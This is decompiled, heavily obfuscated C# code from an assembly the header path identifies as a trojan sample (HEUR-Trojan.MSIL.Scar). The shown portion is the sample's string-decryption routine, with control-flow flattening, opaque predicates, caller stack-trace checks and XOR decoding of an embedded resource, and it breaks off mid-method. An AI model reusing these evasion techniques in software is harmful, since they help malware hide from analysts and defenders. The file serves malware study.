// Decompiled with JetBrains decompiler
// Type: Arrznfhcz.Objects.Publisher
// Assembly: ConsoleApp13, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B655A79A-67BF-4D11-3C9F-30AAF7B05A65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scar.gen-9cde0d9eb4a1bd5801ecea6dca2b0883ce6136a99ec76c4e9dbcbbf06f186f49.exe

using Arrznfhcz.Exceptions;
using Arrznfhcz.Expressions;
using ConsoleApp13.Managers;
using ConsoleApp13.Structs;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Arrznfhcz.Objects
{
  internal static class Publisher
  {
    private static int singleton;
    private static byte[] connection;
    private static ConcurrentDictionary<int, string> _Global;
    private static Publisher.DicExceptionMock m_Reader;
    private static byte[] request;
    private static Publisher.TranslationResult _Importer;
    private static short candidate;
    private static int _Tokenizer;
    private static int m_Tag;
    private static Publisher CustomizeWrapper;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Publisher()
    {
      int num1 = -201371470;
      int num2 = num1 + 151798302;
      Publisher._Global = new ConcurrentDictionary<int, string>();
      int num3 = 2;
      int num4 = 12;
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_168e88bedce74fe8bc918f876218b4f7 == 0)
        goto label_2;
label_1:
      int num5;
      num4 = num5;
label_2:
      StackTrace stackTrace;
      int num6;
      while (true)
      {
        int num7;
        StackFrame frame;
        Type type1;
        MethodBase methodBase;
        object obj;
        Type type2;
        switch (num4)
        {
          case 1:
          case 6:
            if (type1 == (Type) null)
            {
              num4 = 9;
              continue;
            }
            Publisher._Importer |= (Publisher.TranslationResult) 16;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_6023c49d8ec34836b214563739bc0226 == 0)
            {
              num4 = 10;
              continue;
            }
            goto label_1;
          case 2:
          case 11:
          case 18:
            goto label_13;
          case 3:
          case 13:
            num6 = ~--~~--~-~~((-1053846298 ^ num1) + num2) ^ ~-~--~~-~(num1 + 474931223 ^ num2);
            if (frame != null)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_dba176b596bd4473a90305bfa4f2ecb4 != 0)
              {
                num4 = 15;
                continue;
              }
              goto label_1;
            }
            else
            {
              obj = (object) null;
              break;
            }
          case 4:
            num7 = 1;
            frame = stackTrace.GetFrame(num7);
            num4 = 13;
            continue;
          case 5:
            if (frame != null)
            {
              num4 = 3;
              continue;
            }
            goto label_30;
          case 7:
            frame = stackTrace.GetFrame(num3);
            num7 = num3;
            num4 = 5;
            continue;
          case 8:
          case 14:
            num6 ^= ~-~--~~-~((num1 ^ -250835771) + num2);
            num4 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_4d96845969c54a4f8f3e52915e7ef9b3 != 0 ? 16 : 4;
            continue;
          case 9:
            if (!Publisher.MapWrapper((object) stackTrace, num7))
            {
              num4 = 8;
              continue;
            }
            goto case 20;
          case 10:
            goto label_29;
          case 12:
            stackTrace = new StackTrace(num3, false);
            num3 -= 2;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_7288b009871b4477a2047e9e1056cc42 == 0)
            {
              num4 = 7;
              continue;
            }
            goto label_1;
          case 15:
            obj = Publisher.SortWrapper((object) frame);
            break;
          case 16:
            Publisher._Importer |= (Publisher.TranslationResult) 1;
            num4 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d10e5279890341ec844a826edfc91e91 != 0 ? 2 : 0;
            continue;
          case 17:
            type2 = (Type) null;
            goto label_36;
          case 19:
            if (frame != null)
              num6 ^= -~~--~-~~(-465977885 - num1 + num2);
            if ((object) methodBase == null)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e749e26f727a446ca597537953d7d4ed == 0)
              {
                num4 = 17;
                continue;
              }
              goto label_1;
            }
            else
            {
              type2 = methodBase.DeclaringType;
              goto label_36;
            }
          case 20:
            Publisher._Importer = (Publisher.TranslationResult) 16 | Publisher._Importer;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_219c2510cd834ee6902befae34807c97 == 0)
            {
              num4 = 0;
              continue;
            }
            goto label_1;
          case 21:
            // ISSUE: type reference
            if (!(type1 == Publisher.ConcatWrapper(__typeref (RuntimeMethodHandle))))
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5609a52ca07947cf84535ca32afd24cf == 0)
              {
                num4 = 1;
                continue;
              }
              goto label_1;
            }
            else
            {
              Publisher._Importer = (Publisher.TranslationResult) 4 | Publisher._Importer;
              num6 ^= (num1 ^ 250921285 ^ num2) + num3;
              num4 = 11;
              continue;
            }
          default:
            num6 ^= -~~--~-~-~~(-250968672 - num1 - num2) - num3;
            num4 = 18;
            continue;
        }
        methodBase = (MethodBase) obj;
        num4 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_da40be43f0044659847cb314b955d255 == 0 ? 19 : 15;
        continue;
label_36:
        type1 = type2;
        num4 = 21;
      }
label_13:
      Publisher.singleton = num6 + Publisher.singleton;
      return;
label_29:
      num6 ^= -~~--~-~~(-151813761 - num1 ^ num2) - num3;
      goto label_13;
label_30:
      stackTrace = new StackTrace();
      num5 = 4;
      goto label_1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string ManageObserver(int res_ID)
    {
      string str;
      return Publisher._Global.TryGetValue(res_ID, out str) ? str : Publisher.LogoutObserver(res_ID, true);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string LogoutObserver(int spec_Y, bool hascol)
    {
      int num1 = -2079348741;
      int num2 = 37237334 - num1;
      int num3 = 35;
      string str;
      ConcurrentDictionary<int, string> global1;
      while (true)
      {
        int num4;
        int index1;
        int config1;
        int num5;
        byte num6;
        int length1;
        byte[] bytes;
        uint num7;
        int num8;
        bool flag1;
        byte[] numArray1;
        byte[] numArray2;
        int index2;
        int length2;
        byte num9;
        byte num10;
        bool flag2;
        char[] chArray1;
        int index3;
        byte[] numArray3;
        ushort num11;
        int num12;
        byte num13;
        ConcurrentDictionary<int, string> global2;
        byte num14;
        byte[] connection;
        bool flag3;
        int tokenizer;
        bool lockTaken;
        byte[] numArray4;
        switch (num3)
        {
          case 1:
            num14 = (byte) num11;
            num11 >>= 8;
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_aa6040258dd646c192d37f2ff98d8dff != 0 ? 18 : 5;
            continue;
          case 2:
            length2 = numArray1.Length;
            num3 = 31;
            continue;
          case 4:
          case 22:
            str = ((Encoding) Publisher.NewWrapper()).GetString(bytes, 0, bytes.Length);
            num3 = 34;
            continue;
          case 5:
            num11 = (ushort) 0;
            num3 = 19;
            continue;
          case 6:
            num9 = numArray3[1];
            num3 = 2;
            continue;
          case 7:
            if (Publisher._Global.Count == 10)
            {
              global1 = Publisher._Global;
              num3 = 13;
              continue;
            }
            goto label_30;
          case 8:
            if (num5 != num12 - 12 + ((37237279 - num1 ^ num2) + (num12 - 12 & 3) << 5))
            {
              num4 = 37;
              break;
            }
            goto label_32;
          case 9:
            index3 = 0;
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_3df0c3a074d7425b8f2ac37e49067215 == 0 ? 11 : 2;
            continue;
          case 10:
            global2 = Publisher._Global;
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_3050edffe1c444e59832d44e047e2092 == 0 ? 33 : 36;
            continue;
          case 11:
            if (index3 < length1)
            {
              num3 = 17;
              continue;
            }
            str = new string(chArray1);
            goto case 34;
          case 12:
            str = string.Intern(str);
            Publisher._Global[spec_Y] = str;
            num4 = 7;
            break;
          case 13:
            goto label_16;
          case 14:
            if (connection != null != (num12 != tokenizer))
            {
              index1 = 0;
              goto label_11;
            }
            else
              goto label_45;
          case 15:
            length1 = config1;
            bytes = numArray2;
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_03d940c5c72b4657afab7fdfc825d6a0 == 0 ? 0 : 0;
            continue;
          case 16:
            num10 = num13;
            num4 = 29;
            break;
          case 17:
            chArray1[index3] = (char) bytes[index3];
            ++index3;
            goto case 11;
          case 18:
            num13 = numArray1[index2];
            numArray1[index2] = (byte) ((uint) ((int) num9 ^ (int) num13 ^ (int) num10 + 3) ^ (uint) num14);
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_978b11593bae4798902b5b1b913ccb2f == 0 ? 2 : 16;
            continue;
          case 19:
            index2 = 0;
            goto label_29;
          case 20:
            if (num5 == num12 - 12)
            {
              chArray1 = new char[length1];
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e0ceade12884447d82e3cdba0ca36703 == 0)
              {
                num3 = 9;
                continue;
              }
              break;
            }
            goto case 4;
          case 21:
            index1 = 1 + index1;
            goto label_11;
          case 23:
            num11 = (ushort) (num7 >> 16);
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_979c881c2be14f0d949ec016198d4388 != 0)
            {
              num3 = 1;
              continue;
            }
            break;
          case 24:
            try
            {
              Monitor.Enter((object) global2, ref lockTaken);
              int num15 = 20;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_3050edffe1c444e59832d44e047e2092 == 0)
                num15 = 16;
              char[] chArray2;
              while (true)
              {
                int num16;
                int skipFrames;
                int startconnection;
                short config2;
                byte[] numArray5;
                StackFrame stackFrame;
                int num17;
                Assembly assembly1;
                Stream manifestResourceStream;
                MethodBase methodBase;
                bool flag4;
                Type declaringType;
                StackTrace i;
                int num18;
                Assembly v;
                short config3;
                int num19;
                int num20;
                long num21;
                int index4;
                object obj;
                switch (num15)
                {
                  case 1:
                    Publisher._Tokenizer = Publisher._Tokenizer & (num1 ^ 170339894) - num2 ^ 99039268 - num1 + num2;
                    num16 = 8;
                    break;
                  case 2:
                    numArray4 = (byte[]) null;
                    num15 = 42;
                    continue;
                  case 3:
                    numArray4[index4] ^= (byte) (Publisher.m_Tag >> ((index4 & 3) << 3));
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_978b11593bae4798902b5b1b913ccb2f != 0)
                    {
                      num15 = 19;
                      continue;
                    }
                    break;
                  case 4:
                    goto label_159;
                  case 5:
                    skipFrames -= 2;
                    stackFrame = (StackFrame) Publisher.InsertWrapper((object) i, skipFrames);
                    num15 = 33;
                    continue;
                  case 6:
                    num17 = Publisher.m_Tag;
                    num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d6aeaec169ea4ccab0c21db15481e545 == 0 ? 3 : 12;
                    continue;
                  case 7:
                    numArray4 = Publisher.m_Reader.InitObserver((int) config3);
                    num15 = 56;
                    continue;
                  case 8:
                    Publisher.m_Tag = num17;
                    num15 = 52;
                    continue;
                  case 9:
                    goto label_79;
                  case 10:
                    num17 ^= (1409175355 ^ num1) + num2;
                    num15 = 25;
                    continue;
                  case 11:
                    assembly1 = (Assembly) Publisher.InstantiateWrapper();
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0dd863ab6ed14241aa15ed1dfcc266fd != 0)
                    {
                      num15 = 24;
                      continue;
                    }
                    break;
                  case 12:
                  case 14:
                  case 54:
                    if (Publisher._Tokenizer == (-98073062 ^ num1 ^ num2))
                    {
                      num15 = 55;
                      continue;
                    }
                    goto case 41;
                  case 13:
                  case 45:
                    if (index4 != numArray4.Length)
                      goto case 3;
                    else
                      goto case 32;
                  case 15:
                    spec_Y = 327691257 - num1 - num2 ^ num17;
                    num15 = 18;
                    continue;
                  case 16:
                    skipFrames = 2;
                    i = new StackTrace(skipFrames, false);
                    Publisher._Tokenizer ^= num1 - 37230864 + num2 | skipFrames;
                    num15 = 5;
                    continue;
                  case 17:
                    Publisher._Tokenizer ^= skipFrames + (37237462 - num1 - num2);
                    num15 = 58;
                    continue;
                  case 18:
                    spec_Y = ((int) numArray5[2] | (int) numArray5[3] << 16 | (int) numArray5[0] << 8 | (int) numArray5[1] << 24) ^ -spec_Y;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_069895991b0244dd8bc443b45e960fce == 0)
                    {
                      num15 = 4;
                      continue;
                    }
                    break;
                  case 19:
                    ++index4;
                    num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_cb7010e75cb34c81864fdc89443c1896 != 0 ? 41 : 45;
                    continue;
                  case 20:
                    if (Publisher.m_Reader == null)
                    {
                      num16 = 11;
                      break;
                    }
                    goto case 6;
                  case 21:
                    chArray2[2] = (char) (99032568 - num1 + num2);
                    num15 = 9;
                    continue;
                  case 22:
                    obj = (object) null;
                    goto label_140;
                  case 23:
                    chArray2[1] = '0';
                    num15 = 21;
                    continue;
                  case 24:
                    v = (Assembly) Publisher.QueryWrapper();
                    Publisher._Tokenizer |= num1 ^ -96485598 ^ num2;
                    Assembly assembly2 = assembly1;
                    StringBuilder stringBuilder = new StringBuilder();
                    int num22 = 636501417 - num1 + num2;
                    ((StringBuilder) Publisher.PatchWrapper((object) stringBuilder, (char) (num22 >> 16))).Append((char) num22);
                    int num23 = num1 - 635829664 ^ num2;
                    Publisher.PatchWrapper((object) stringBuilder.Append((char) (num23 >> 16)), (char) num23);
                    int num24 = 636042660 - num1 + num2;
                    ((StringBuilder) Publisher.PatchWrapper((object) stringBuilder, (char) (num24 >> 16))).Append((char) num24);
                    int num25 = (num1 ^ 438439335) - num2;
                    Publisher.PatchWrapper((object) stringBuilder.Append((char) num25), (char) (num25 >> 16));
                    int num26 = 636304801 - num1 + num2;
                    ((StringBuilder) Publisher.PatchWrapper((object) stringBuilder, (char) (num26 >> 16))).Append((char) num26);
                    int num27 = num1 - 635895200 ^ num2;
                    ((StringBuilder) Publisher.PatchWrapper((object) stringBuilder, (char) num27)).Append((char) (num27 >> 16));
                    int num28 = 574706265 - num1 - num2;
                    stringBuilder.Append((char) num28).Append((char) (num28 >> 16));
                    string name = stringBuilder.ToString();
                    manifestResourceStream = assembly2.GetManifestResourceStream(name);
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_4cde23d9df0b4c5da42edea24a64622f == 0)
                    {
                      num15 = 16;
                      continue;
                    }
                    break;
                  case 25:
                    num21 = Publisher.RateWrapper();
                    num15 = 37;
                    continue;
                  case 26:
                    Publisher.ListWrapper((object) Publisher.m_Reader.AwakeObserver(), (long) num18);
                    if (Publisher.request == null)
                    {
                      if (Publisher.candidate == (short) -1)
                      {
                        config3 = (short) ((int) Publisher.GetWrapper((object) Publisher.m_Reader) ^ num1 - 99021598 - num2 ^ num18);
                        goto case 46;
                      }
                      else
                      {
                        config3 = Publisher.candidate;
                        num15 = 46;
                        continue;
                      }
                    }
                    else
                    {
                      numArray4 = Publisher.request;
                      num15 = 32;
                      continue;
                    }
                  case 27:
                    if (stackFrame == null)
                    {
                      num15 = 50;
                      continue;
                    }
                    goto label_110;
                  case 28:
                    Publisher.connection = Publisher.DestroyObserver(Publisher.FlushObserver(v));
                    num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_52b6392ea2f24f9886f0e1c71b3be7b1 != 0 ? 30 : 11;
                    continue;
                  case 29:
                    flag4 = Publisher.VerifyWrapper(declaringType, (Type) null);
                    if (flag4)
                    {
                      if (Publisher.FillObserver(i, startconnection))
                      {
                        flag4 = false;
                        num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_994f498085e14f5fac4670072b1ed92f != 0 ? 1 : 34;
                        continue;
                      }
                      goto case 57;
                    }
                    else
                      goto case 31;
                  case 30:
                    num17 = Publisher.singleton;
                    Publisher.singleton = 0;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d175a4adf30b4a6fae71758d42fee227 != 0)
                    {
                      num15 = 10;
                      continue;
                    }
                    break;
                  case 31:
                  case 34:
                    if (flag4 == (i != null))
                    {
                      num15 = 49;
                      continue;
                    }
                    goto label_105;
                  case 32:
                  case 42:
                    config1 = Publisher.FillWrapper((object) Publisher.m_Reader) ^ num18 ^ -~-~-~~-~(num1 ^ 345451518 ^ num2) ^ num17;
                    if (config1 == num1 - 37237336 + num2)
                    {
                      num15 = 48;
                      continue;
                    }
                    goto case 59;
                  case 33:
                    startconnection = skipFrames;
                    num15 = 27;
                    continue;
                  case 35:
                    num17 ^= 468899919 - num1 - num2;
                    num17 ^= num1 - 116916665 ^ num2;
                    num19 = num17;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_ffc56c6bf5394c33901a275390a74c63 != 0)
                    {
                      num15 = 0;
                      continue;
                    }
                    break;
                  case 36:
                    goto label_35;
                  case 37:
                    num17 ^= (int) (uint) num21;
                    num16 = 35;
                    break;
                  case 38:
                    if (!flag4)
                    {
                      num16 = 29;
                      break;
                    }
                    goto case 31;
                  case 39:
                    Publisher._Tokenizer ^= -98274029 ^ num1 ^ num2;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_300d51abc2d74aaf9f7d70a870132ede != 0)
                    {
                      num15 = 40;
                      continue;
                    }
                    break;
                  case 40:
                    // ISSUE: type reference
                    flag4 = Publisher.VerifyWrapper(declaringType, Publisher.ConcatWrapper(__typeref (RuntimeMethodHandle)));
                    num15 = 51;
                    continue;
                  case 41:
                    num18 = spec_Y ^ 1771637986 + num1 - num2 ^ num17;
                    num18 ^= -666761484 ^ num1 ^ num2;
                    num15 = 26;
                    continue;
                  case 43:
label_54:
                    Publisher.request = Publisher.m_Reader.InitObserver((int) config2);
                    goto label_95;
                  case 44:
                    num17 = num20 + num17;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_980f98214a424e1bbb362790e548d268 != 0)
                    {
                      num15 = 1;
                      continue;
                    }
                    break;
                  case 46:
                    if (config3 == (short) 0)
                    {
                      num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_898c0605ac9640458e59804baf843842 == 0 ? 0 : 2;
                      continue;
                    }
                    goto case 7;
                  case 47:
                    num17 ^= -~-~-~~-~(-750651618 - num1 ^ num2);
                    num15 = 44;
                    continue;
                  case 48:
                    numArray5 = Publisher.m_Reader.InitObserver(4);
                    num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_dda405246662441da72f7128bc7af5e6 == 0 ? 1 : 15;
                    continue;
                  case 49:
                    Publisher._Tokenizer = 32 ^ Publisher._Tokenizer;
                    goto label_105;
                  case 50:
                    i = new StackTrace();
                    startconnection = 1;
                    stackFrame = (StackFrame) Publisher.InsertWrapper((object) i, startconnection);
                    goto label_110;
                  case 51:
                    Publisher._Tokenizer ^= 37237494 - num1 - num2;
                    num15 = 38;
                    continue;
                  case 52:
                    if ((Publisher._Importer & (Publisher.TranslationResult) ~--~~-~--~~((num1 ^ -98095694) - num2)) != (Publisher.TranslationResult) 0)
                    {
                      num15 = 54;
                      continue;
                    }
                    goto case 53;
                  case 53:
                    Publisher._Tokenizer = 99076442 - num1 + num2;
                    num15 = 14;
                    continue;
                  case 55:
                    chArray2 = new char[3]
                    {
                      (char) (num1 - 99032392 - num2),
                      char.MinValue,
                      char.MinValue
                    };
                    num15 = 23;
                    continue;
                  case 56:
                    index4 = 0;
                    num15 = 13;
                    continue;
                  case 57:
                    Publisher._Tokenizer ^= num1 - 98817331 ^ num2;
                    num15 = 31;
                    continue;
                  case 58:
                    declaringType = methodBase?.DeclaringType;
                    if (stackFrame == null)
                    {
                      num15 = 39;
                      continue;
                    }
                    goto case 40;
                  case 59:
                    tokenizer = Publisher._Tokenizer;
                    num12 = -96492250 ^ num1 ^ num2;
                    num5 = tokenizer - 12;
                    num8 = config1;
                    config1 &= num1 + 231198121 + num2;
                    numArray2 = Publisher.m_Reader.InitObserver(config1);
                    connection = Publisher.connection;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_ad654c0db05344b8a3d71d50373a60af == 0)
                    {
                      num15 = 36;
                      continue;
                    }
                    break;
                  case 60:
                    Publisher.candidate = (short) ((int) Publisher.GetWrapper((object) Publisher.m_Reader) ^ (int) (short) -~~-~-~-~-~(37206791 - num1 - num2));
                    goto label_95;
                  default:
                    int num29 = num19 * (37242627 - num1 - num2) % (num1 ^ -75472819 ^ num2) ^ num1 - 581259667 - num2;
                    int num30 = 37237289 - num1 ^ num2;
                    int num31 = num29;
                    ClassAccountException<int> accountException = ((InfoParameterManager<int>) new IssuerStatusStructBuilder.PrinterParserPool(num1 - 99032482 - num2)
                    {
                      initializer = num31
                    }).ViewObserver();
                    try
                    {
                      while (true)
                      {
                        if (!accountException.\u0006\u2004\u200A\u0002())
                          goto label_68;
label_66:
                        int num32 = accountException.\u0006\u2004\u200A\u0002();
                        num29 ^= num32 - num30;
                        num30 -= num29 + 3 >> 8;
                        continue;
label_68:
                        int num33 = 0;
                        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_391c169eb16a4f0bad4c6e8218b29cb5 == 0)
                          goto label_69;
label_65:
                        switch (num33)
                        {
                          case 1:
                            goto label_66;
                          default:
                            goto label_91;
                        }
label_69:
                        int num34;
                        num33 = num34;
                        goto label_65;
                      }
                    }
                    finally
                    {
                      if (accountException == null)
                      {
                        int num35 = 0;
                        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_c8f2d4ff88384267bb490ff9207638e0 == 0)
                        {
                          int num36;
                          num35 = num36;
                        }
                        switch (num35)
                        {
                        }
                      }
                      else
                        Publisher.PublishWrapper((object) accountException);
                    }
label_91:
                    num20 = num29;
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_857fbc1eb13d453dba2985e6c5d95884 != 0)
                    {
                      num15 = 47;
                      continue;
                    }
                    break;
                }
label_50:
                num15 = num16;
                continue;
label_95:
                v = assembly1;
                num15 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_17a4a8c0b9c34bb68e273562658de821 != 0 ? 28 : 3;
                continue;
label_105:
                Publisher._Tokenizer ^= 37243836 - num1 - num2 | skipFrames + 1;
                Publisher.m_Reader = new Publisher.DicExceptionMock(manifestResourceStream);
                config2 = (short) ((int) Publisher.GetWrapper((object) Publisher.m_Reader) ^ (int) (short) -~~--~-~-~~((98128217 ^ num1) + num2));
                if (config2 == (short) 0)
                {
                  num16 = 60;
                  goto label_50;
                }
                else
                  goto label_54;
label_110:
                if (stackFrame == null)
                {
                  num15 = 22;
                  continue;
                }
                obj = Publisher.SortWrapper((object) stackFrame);
label_140:
                methodBase = (MethodBase) obj;
                num15 = 17;
              }
label_79:
              str = new string(chArray2);
              return str;
            }
            finally
            {
              if (lockTaken)
              {
                Publisher.CreateWrapper((object) global2);
                int num37 = 0;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_bc26819773b3449b89fd956b3e31a805 != 0)
                  goto label_144;
label_142:
                switch (num37)
                {
                  default:
                    goto label_145;
                }
label_144:
                int num38;
                num37 = num38;
                goto label_142;
              }
label_145:;
            }
label_159:
            if (!Publisher._Global.TryGetValue(spec_Y, out str))
              goto case 10;
            else
              goto label_27;
          case 25:
            flag2 = (num8 & (1171837534 ^ num1) + num2) != 0;
            num3 = 27;
            continue;
          case 26:
            num7 = (uint) (((int) numArray3[0] | (int) numArray3[2] << 8) + ((int) num10 << 3));
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d6aeaec169ea4ccab0c21db15481e545 != 0)
            {
              num3 = 5;
              continue;
            }
            break;
          case 27:
            flag1 = (num8 & (-2110246314 - num1 ^ num2)) != 0;
            byte[] numArray6 = numArray4;
            numArray1 = numArray2;
            numArray3 = numArray6;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_3a677338021d44b693a957b23c2f29eb == 0)
            {
              num3 = 6;
              continue;
            }
            break;
          case 28:
            numArray2[index1] = (byte) ((uint) numArray2[index1] ^ (uint) num6);
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_98b28f354a1e425aa5e67c8dfd421ec2 == 0 ? 21 : 5;
            continue;
          case 29:
            index2 = 1 + index2;
            goto label_29;
          case 30:
label_34:
            byte num39 = connection[index1 & 7];
            num6 = (byte) ((int) num39 << 3 | (int) num39 >> 5);
            num3 = 28;
            continue;
          case 31:
            num10 = (byte) (length2 + 11 ^ 7 + (int) num9);
            num3 = 26;
            continue;
          case 32:
label_35:
            flag3 = (num8 & (-499633578 - num1 ^ num2)) != 0;
            num4 = 25;
            break;
          case 33:
label_31:
            if ((1 & index2) == 0)
            {
              num7 = (uint) ((int) num7 * ((-98276957 ^ num1) - num2) + (35503251 - num1 ^ num2));
              num3 = 23;
              continue;
            }
            goto case 1;
          case 34:
            num5 += num1 - 99032353 - num2 + (num5 & 3) << 5;
            num3 = 8;
            continue;
          case 35:
            str = (string) null;
            num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_a6ad5c644f86466996a6373b271be5bb != 0 ? 10 : 9;
            continue;
          case 36:
            lockTaken = false;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8cf8a65ced8c48c99edb56b7fec22679 == 0)
            {
              num3 = 24;
              continue;
            }
            break;
          case 37:
            int num40 = config1 + spec_Y ^ num1 - 98095912 - num2 ^ num5 & (37238609 - num1 ^ num2);
            ref int local = ref num40;
            StringBuilder stringBuilder1 = new StringBuilder();
            int num41 = num1 - 37237246 + num2;
            Publisher.PatchWrapper((object) stringBuilder1, (char) (byte) num41);
            string format = stringBuilder1.ToString();
            str = local.ToString(format);
            goto label_32;
          default:
            if (!flag3)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_bec2176401fe4c94970c61a9424ebdea == 0)
              {
                num3 = 22;
                continue;
              }
              break;
            }
            goto case 20;
        }
        num3 = num4;
        continue;
label_11:
        if (index1 < config1)
          goto label_34;
        else
          goto label_45;
label_29:
        if (index2 >= length2)
        {
          numArray2 = numArray1;
          num3 = 14;
          continue;
        }
        goto label_31;
label_32:
        if (!flag1 & hascol)
        {
          num3 = 12;
          continue;
        }
        goto label_30;
label_45:
        if (flag2)
        {
          length1 = (int) numArray2[2] | (int) numArray2[0] << 16 | (int) numArray2[3] << 8 | (int) numArray2[1] << 24;
          bytes = new byte[length1];
          Publisher.PopWrapper((object) numArray2, 4, (object) bytes);
          num3 = 3;
        }
        else
          num3 = 15;
      }
label_16:
      bool lockTaken1 = false;
      try
      {
        Monitor.Enter((object) global1, ref lockTaken1);
        int num42 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e40294d60c44452db75c0716bb655934 == 0)
          num42 = 1;
        while (true)
        {
          switch (num42)
          {
            case 1:
              Publisher.CloneWrapper((object) Publisher.m_Reader);
              Publisher.m_Reader = (Publisher.DicExceptionMock) null;
              num42 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_94b43952bd2f4d6d8a61dbd2338be9d8 != 0 ? 0 : 0;
              continue;
            default:
              goto label_154;
          }
        }
label_154:
        Publisher.request = (byte[]) null;
        Publisher.connection = (byte[]) null;
        goto label_30;
      }
      finally
      {
        if (lockTaken1)
          Monitor.Exit((object) global1);
